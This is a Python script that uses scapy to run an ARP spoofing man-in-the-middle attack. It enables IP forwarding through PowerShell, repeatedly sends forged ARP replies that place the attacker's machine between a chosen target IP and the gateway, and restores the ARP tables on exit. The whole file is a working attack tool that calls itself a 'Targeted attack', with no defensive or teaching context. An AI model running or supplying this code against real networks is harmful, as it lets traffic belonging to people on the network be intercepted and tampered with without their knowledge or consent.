import scapy.all as scapy
import threading
import time
import subprocess

INTERFACE = scapy.conf.iface.name
GATEWAY_IP = scapy.conf.route.route("0.0.0.0")[2]
TARGET_IP = "0.0.0.0" # Target IP address 

tracked_devices = {TARGET_IP}
device_writers = {}
stop_event = threading.Event()
MY_MAC = None

def Aget_mac(ip):
    print(f"[*] Resolving MAC for {ip}...")
    try:
        ans, _ = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip), timeout=2, verbose=False)
        if ans:
            return ans[0][1].hwsrc
    except Exception:
        pass
    return None

def Lenable_ip_forwarding():
    print("[*] Enabling IP Forwarding...")
    try:
        cmd = "Set-NetIPInterface -Forwarding Enabled"
        subprocess.run(["powershell", "-Command", cmd], capture_output=True)
    except Exception:
        pass

def Mspoof_target(target_ip, gateway_ip):
    target_mac = Aget_mac(target_ip)
    gateway_mac = Aget_mac(gateway_ip)
    if not target_mac or not gateway_mac:
        print("[!] Failed to resolve MACs. Exiting.")
        return
    print(f"[*] Spoofing {target_ip} <--> {gateway_ip}")
    p1 = scapy.Ether(dst=target_mac)/scapy.ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac)
    p2 = scapy.Ether(dst=gateway_mac)/scapy.ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac)

    while not stop_event.is_set():
        scapy.sendp(p1, verbose=False)
        scapy.sendp(p2, verbose=False)
        time.sleep(2)

def Orestore_network():
    print("[*] Restoring ARP tables...")
    target_mac = Aget_mac(TARGET_IP)
    gateway_mac = Aget_mac(GATEWAY_IP)
    if target_mac and gateway_mac:
        res = scapy.Ether(dst=target_mac)/scapy.ARP(op=2, pdst=TARGET_IP, psrc=GATEWAY_IP, hwdst=target_mac, hwsrc=gateway_mac)
        scapy.sendp(res, count=5, verbose=False)
        res_gw = scapy.Ether(dst=gateway_mac)/scapy.ARP(op=2, pdst=GATEWAY_IP, psrc=TARGET_IP, hwdst=gateway_mac, hwsrc=target_mac)
        scapy.sendp(res_gw, count=5, verbose=False)

def Gmain():
    global MY_MAC
    Lenable_ip_forwarding()
    MY_MAC = scapy.get_if_hwaddr(INTERFACE)
    spoof_thread = threading.Thread(target=Mspoof_target, args=(TARGET_IP, GATEWAY_IP), daemon=True)
    spoof_thread.start()
    try:
        print(f"[*] Targeted attack running on {TARGET_IP}. Press Ctrl+C to stop.")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Stopping...")
        stop_event.set()
        Orestore_network()

if __name__ == "__main__":
    Gmain()
